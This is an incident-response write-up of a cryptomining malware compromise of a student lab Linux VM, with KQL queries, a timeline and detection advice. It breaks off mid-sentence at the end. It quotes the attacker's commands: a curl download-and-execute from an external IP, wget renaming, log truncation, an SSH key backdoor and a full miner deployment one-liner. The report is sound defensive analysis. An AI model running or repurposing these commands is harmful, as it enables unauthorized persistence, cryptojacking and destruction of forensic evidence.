# Linux Miner Infection  

---

## Report Information

- **Analyst:** Justin Soflin  
- **Date Completed:** Feb. 04, 2026  
- **Environment Investigated:** Cyber Range at LOG(N) Pacific  
- **Hosts Investigated:**  
  - `linux-programmatic-fix-michael`  
  - `linuxprogrammaticpabon`  
- **User Context:** root | Unauthorized miner installation & persistence  
- **Tools & Data Sources:** Microsoft Defender for Endpoint, Log Analytics Workspaces, KQL (Kusto Query Language), Linux audit logs  
- **Scope:** SYSTEM-level execution, persistence analysis, malware delivery chain reconstruction, log tampering assessment  

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Investigation](#investigation)
  - [Initial Detection: Malware or PUA Observed](#initial-detection-malware-or-pua-observed)
  - [Authentication Context and Lab Configuration](#authentication-context-and-lab-configuration)
  - [Malicious Binary Download Detected](#malicious-binary-download-detected)
  - [Multiple Download Methods Observed](#multiple-download-methods-observed)
  - [Binary Relocation and Renaming](#binary-relocation-and-renaming)
  - [Persistence via /etc/init.d](#persistence-via-etcinitd)
  - [Log Tampering via cat /dev/null](#log-tampering-via-cat-devnull)
  - [SSH Key Implantation](#ssh-key-implantation)
  - [Malware Validation and Classification](#malware-validation-and-classification)
- [Recommended Actions](#recommended-actions)
- [Conclusion](#conclusion)

---

## Executive Summary

The student Linux virtual machine `linux-programmatic-fix-michael` was compromised by an automated cryptocurrency mining malware campaign. The investigation was initiated following a Microsoft Defender for Endpoint alert indicating **Malware or  PUA (Potentially Unwanted Application) Observed**.

This incident occurred during an active **student lab exercise** in which the **root account password was intentionally set to `root`** to generate alerts during Tenable vulnerability scanning exercises. While expected in a controlled instructional environment, this configuration significantly weakened the system’s security posture and exposed the VM to real-world internet scanning and brute-force activity.

Telemetry confirms that an external actor successfully authenticated as `root`, downloaded and executed a malicious ELF binary, established persistence using legacy init scripts, renamed system utilities to evade detection, implanted SSH keys for long-term access, and deliberately destroyed forensic artifacts.

VirusTotal analysis of the recovered binary returned a **46 / 63 detection score**, classifying the file as a **Trojan**, confirming the activity was malicious and not the result of student experimentation or administrative automation.

---

## Investigation

### Initial Detection: Malware or PUA Observed

<img width="1280" height="648" alt="image" src="https://github.com/user-attachments/assets/23305203-e6f9-4434-918b-dd3c6c2dceb1" />

The investigation began after Microsoft Defender for Endpoint generated an alert indicating **Malware or PUA** activity on the Linux host. The alert correlated with suspicious file creation and execution behavior occurring under the `root` user context.

This detection prompted analysis of:

- File creation events  
- Process execution telemetry  
- Authentication and logon activity  
- Network-based download behavior  

<img width="1280" height="646" alt="image" src="https://github.com/user-attachments/assets/030f8102-196a-40a7-86d7-a291bb89e4e5" />

- MDE mapped a lengthy Process Tree, highlighting several suspicious processes:
   - Suspicious file dropped and launched
   - Suspicious shell command execution
   - Suspicious file or content ingress
   - Executable permission added to file or directory
   - Suspicious shell script launched
- Along with many suspicious commands observed:
   - wget (Remote file download)
   - curl (Payload retrieval / C2 communication)
   - chmod (Permission modification for execution)
   - cron (Persistence via scheduled task, Linux scheduler)
   - dash (Lightweight shell used to execute scripts)
  
---

### First Look Into Compromised Device

```kql
DeviceProcessEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated desc
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, InitiatingProcessParentFileName, ProcessCommandLine
```

<img width="1144" height="326" alt="image" src="https://github.com/user-attachments/assets/d4180bbb-a5bd-4228-849a-da6448cde0a9" />

<br>

- What this means:
   - A persistent root-level session existed for ~48 hours
   - That session repeatedly executed thousands of short-lived binaries
   - Filenames were randomized
   - Execution counts were throttled per binary
   - Activity pattern indicates automation, not human typing
   - Behavior is inconsistent with legitimate admin activity

<img width="1184" height="470" alt="image" src="https://github.com/user-attachments/assets/5deb645c-ed6c-4d8c-bbab-548841fd69e9" />

- Session ID `79416`
   - Value is derived from Linux and added by MDE
   - Correlates sessions to file name randomization
   - Logs show **over 15,000** commands linking to the same session for this VM
   - All originating from the same ParentFile `ygljglkjgfg0`
   - Each command is within milliseconds of each other

```
Linux kernel:  creates session 79416
        ↓
MDE sensor:   observes + labels it
        ↓
Log Analytics: stores & exposes it
```

---

### Authentication Context and Lab Configuration

At the time of compromise, the VM was actively being used for a **student lab exercise** designed to trigger insecure authentication practices for Tenable scans.

Lab configuration included:

- SSH access intentionally exposed  
- **Root password set to `root`**  
- Expected vulnerability generation in Tenable

<img width="790" height="274" alt="image" src="https://github.com/user-attachments/assets/d043b7bf-4f49-40da-9512-3ed08265f18c" />

This configuration mirrors conditions exploited by real-world automated attack campaigns. Multiple external IP addresses attempted authentication across multiple lab VMs, consistent with **opportunistic brute-force activity**.

The successful `root` authentication observed during this investigation is attributed to **external automated intrusion**, not legitimate student activity.

---

### Student changes Root password | AHTKzAEv
- Student begins the lab, changing root password to 'root'
   - `2026-01-30T13:50:32.826013Z` (1:50pm) — /etc/shadow edited by labuser via root (likely a password change)
   - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created

Within minutes, `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes.

```kql
DeviceFileEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated asc
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<br>

<img width="1103" height="283" alt="image" src="https://github.com/user-attachments/assets/6ac566a0-a285-4a43-b403-a1ee36c917fc" />

<Br>

-File lifecycle after creation:
   - 2:02:04 — AHTKzAEv and multiple x.sh files created, initial payload and helper scripts
   - 2:02:04.957 — retea in /dev/shm created, /dev/shm is shared memory; malware sometimes drops helpers here for fast execution or stealth (RAM-only execution)
   - 2:02:05 — /root/.ssh/authorized_keys updated Allows persistence via SSH (attacker can log in without a password)
   - 2:02:05 — /etc/passwd and /etc/shadow updated Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password.
- Repeated FileCreated / FileDeleted events for x.sh and AHTKzAEv
   - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
   - Deleting files is often to avoid forensic detection
   - 
```
/var/tmp/AHTKzAEv          <- the malicious binary
  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0

```

<img width="1035" height="393" alt="image" src="https://github.com/user-attachments/assets/dcc3a47c-84ca-4431-81ed-79a4bed88857" />
 
### Root Cron Persistence

<img width="1280" height="393" alt="image" src="https://github.com/user-attachments/assets/befdedff-5972-4200-bc63-a321887ec73e" />

start time: 2026-01-30T14:04:23.447447Z
end: 2026-02-02T22:47:03.418251Z
Attacker gains root
Drops AHTKzAEv
Modifies SSH + passwords
Installs root cron persistence
Cron runs every minute
Cron:
Drops .b4nd1d0 into /var/tmp/*
Executes payload
Rewrites cron to ensure it stays installed
This is post-compromise persistence, not recon.

Root-level scheduled persistence was established via crontab
The cron job executed every ~60 seconds
It repeatedly spawned hidden payloads in /var/tmp
This activity was automated and non-interactive

### .b4nd1d0 & diicot
- a _leetspeak_ spelling of "Bandito"
- Known Malware Associations
   - .b4nd1d0 has been observed in real Linux malware families in the wild
   - It’s typically a secondary payload, backdoor, or helper binary
   - Its consistent naming makes it easier for the malware’s cron/systemd scripts to find and execute it repeatedly.

- Random gibberish names = likely session-specific payloads
   - .b4nd1d0 = fixed, intentional, likely malicious component
   - Its repeated creation alongside cron persistence is a strong indicator of automated malware activity, not just a student experiment.

 <br>
 
<img width="643" height="583" alt="image" src="https://github.com/user-attachments/assets/d775f701-74fa-44bf-bda9-2ca113e9ff3b" /> <br>
SOURCE: DarkTrace blog

<br>

### Malicious Binary Download p.txt ./ygljglkjgfg0

<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />

- `ygljglkjgfg0` appears
   - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
   - First seen at /usr/bin/ygljglkjgfg0 = persistent executable
   - Then copied to /etc/init.d/ygljglkjgfg0 = run at boot
   - and /etc/cron.hourly/gcc.sh = run every hour or as scheduled
  
- Inumerable randomized file names copied from ygljglkjgfg0
- These are clones or secondary payloads:
   - Backdoors
   - Miner binaries
   - Remote control scripts
- Randomized file names (tdrbhhtkky, omicykvmml) evade detection

- Crontab modification
You see a bunch of tmp.* files in /var/spool/cron/crontabs/ (like tmp.RYF9JE and tmp.SHGiEW) along with root crontab activity.
These are temporary cron files created when the malware manipulates the root crontab.
Tools like crontab - write to temp files first, then rename them into place.
That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job.

The malware edits /etc/crontab to remove old references to gcc.sh and add a new entry:
*/3 * * * * root /etc/cron.hourly/gcc.sh
This ensures the malware executes every 3 minutes.
This explains why cron is still active but “drowned out” — it’s being overwritten and hijacked by the malware.

✅ Key points from this activity
Persistent scheduling: malware hijacks cron and cron.hourly.
Multi-stage deployment: initial payload (ygljglkjgfg0) spawns additional binaries.
Self-replication: copies itself to multiple locations for redundancy.
Remote fetch: uses curl/wget to pull more binaries.
Cleanup & rename: old cron temp files are renamed/removed to hide traces.

<br>

<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />

<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" />

<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />



- Keep the same URL so all infected machines keep pulling the “latest version”
- FileType: Elf (Executable and Linkable Format) even though it's named .txt
   - Not actually a text file, but a compiled Linux binary
   - Name file .txt to avoid suspicion
   - Download → Rename → Execute 

- curl http://23.160.56.194/p.txt -o ygljglkjgfg0
./ygljglkjgfg0
   - p.txt = malicious ELF binary
   - ygljglkjgfg0 = renamed executable copy

<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />

23.160.56.194 > p.txt download
<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />

---

### Multiple Download Methods Observed

Process telemetry revealed redundant payload retrieval attempts:

```kql
DeviceProcessEvents  
| where DeviceName == "linux-programmatic-fix-michael"  
| where ProcessCommandLine has_any ("curl", "wget", "good")  
| project TimeGenerated, FileName, ProcessCommandLine  
| order by TimeGenerated asc  
```

The same payload was retrieved using:

- `curl`  
- `wget`  
- `good` (a renamed system utility)  

This behavior strongly indicates **automated malware execution**, not manual user activity.

---

### Binary Relocation and Renaming

The attacker deliberately renamed trusted system binaries:

mv /usr/bin/wget /usr/bin/good  
mv /bin/wget /bin/good  

Renaming trusted utilities allows continued payload delivery while bypassing simplistic detections that rely on binary names.

---

### Persistence via /etc/init.d

Persistence was established by creating an init script:

```kql
DeviceFileEvents  
| where DeviceName == "linux-programmatic-fix-michael"  
| where FolderPath startswith "/etc/init.d"  
| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine  
| order by TimeGenerated desc  
```

Why this is significant:

- `/etc/init.d` scripts execute automatically on boot  
- Execution occurs as `root`  
- Persistence survives reboots and user logouts  

This confirms **intentional long-term persistence**.

---

### Log Tampering via cat /dev/null

The attacker deliberately destroyed forensic evidence by truncating multiple logs:

cat /dev/null >/root/.bash_history  
cat /dev/null >/var/log/wtmp  
cat /dev/null >/var/log/btmp  
cat /dev/null >/var/log/lastlog  
cat /dev/null >/var/log/secure  
cat /dev/null >/var/log/syslog  

Because these logs were cleared on the host, historical entries no longer existed for ingestion into Log Analytics, significantly limiting post-incident visibility.

---

### SSH Key Implantation

A persistent SSH backdoor was implanted:

chattr -ia ~/.ssh/authorized_keys  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
chattr +ai ~/.ssh/authorized_keys  

Setting the immutable attribute (`+i`) prevents easy removal and ensures continued access even if credentials are rotated.

---

### Malware Validation and Classification

The malicious ELF binary was validated using VirusTotal:

- **Detection score:** 46 / 63  
- **Classification:** Trojan  
- **Observed behaviors:**  
  - Cryptocurrency mining  
  - Process termination of competing miners  
  - Persistence installation  
  - Log destruction  

This confirms the activity represents a **real-world malware compromise**.

---

## Recommended Actions

### Immediate Recovery

- Redeploy affected virtual machines  
- Remove unauthorized init scripts  
- Rotate all credentials and SSH keys  
- Rebuild systems from trusted images  

### Monitoring Improvements

- Alert on writes to `/etc/init.d`  
- Monitor renaming of binaries in `/bin` and `/usr/bin`  
- Detect log truncation behavior  
- Alert on modifications to `authorized_keys`  
- Flag repeated download attempts from single external IPs  

---

## Conclusion

This incident represents a **complete Linux system compromise** performed by automated malware exploiting weak authentication during a student lab exercise. While the insecure configuration was intentional for instructional purposes, it created conditions identical to real-world attack surfaces.

Microsoft Defender for Endpoint successfully detected the malicious activity, enabling investigation and confirmation of compromise. This case highlights how quickly exposed Linux systems can be compromised and reinforces the importance of monitoring persistence mechanisms, binary integrity, and log tampering — even in educational or non-production environments.


## Misc

109.206.236.18
Beaconing = the infected machine initiating an outbound connection to an attacker-controlled server.

./network "rm -rf /var/tmp/Documents /tmp/cache ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ;  cd /tmp/ ;  chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"

🔥 What This Script Is Doing (High-Level)

This command is:

Cleaning up previous infections

Killing competing malware/miners

Setting up its working directory

Moving payload files into a hidden location

Making them executable

Running them in the background

Wiping evidence

This is a very typical Linux cryptominer deployment flow.

🧹 Step 1 — Cleanup & Reset
rm -rf /var/tmp/Documents /tmp/cache
mkdir /var/tmp/Documents


Deletes old copies of itself and recreates its working folder.

So /var/tmp/Documents is its “base of operations.”

⛔ Step 2 — Remove Persistence + SSH Protections
crontab -r


Deletes all scheduled cron jobs.
This removes other malware persistence — or even legit jobs.

chattr -iae ~/.ssh/authorized_keys


Removes file immutability flags.

This is interesting:

chattr can make files undeletable.

They remove attributes so they can modify SSH keys.

This suggests:
✔ They may insert their own SSH key later
✔ Or they’re ensuring nothing blocks them

💀 Step 3 — Kill Competing Miners
pkill Opera
pkill cnrig
pkill xmrig
pkill java
killall java
killall xmrig
killall cnrig


This is classic cryptominer turf war behavior.

xmrig → Monero miner

cnrig → Variant miner

java → Many botnets use Java-based loaders

Opera → Some miners disguise themselves as browser processes

They are eliminating competition to own 100% of CPU.

This strongly confirms:

This is a mining bot.

📦 Step 4 — Move Payloads to Hidden Location
mv /var/tmp/diicot /var/tmp/Documents/.diicot
mv /var/tmp/kuak /var/tmp/Documents/kuak


Key observations:

.diicot → Hidden file (dot prefix)

kuak → Likely secondary loader or helper binary

This is deliberate naming — not random.

You asked earlier if it was random.
It is not. It’s reused consistently across runs.

⚙ Step 5 — Make Executable
chmod +x .*


Makes hidden files executable.

🚀 Step 6 — Launch Payload in Background
/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown


Runs silently

Redirects all output to null

Backgrounds it

Detaches from shell

Stealth execution.

Then:

cd /tmp/
chmod +x cache
./cache >/dev/null 2>&1 & disown


So there’s also a /tmp/cache binary running.

This is likely:

Main miner + watchdog

Or miner + loader

Two-process persistence pattern.

🧽 Step 7 — Anti-Forensics
history -c
rm -rf .bash_history ~/.bash_history


Clears command history.

They do this twice — before and after launching processes.

Very intentional.

🧠 What’s Interesting Technically

It removes cron jobs — but does not re-add one here.
So persistence may happen inside .diicot.

It manipulates authorized_keys attributes — suspicious.

Uses /var/tmp not /tmp.
/var/tmp survives reboots.

Hidden filename .diicot
That’s deliberate branding.

The repetition in logs suggests:

It keeps redeploying

Or something keeps killing it and it relaunches

🎯 Why It Keeps Repeating in Your Logs

Likely one of:
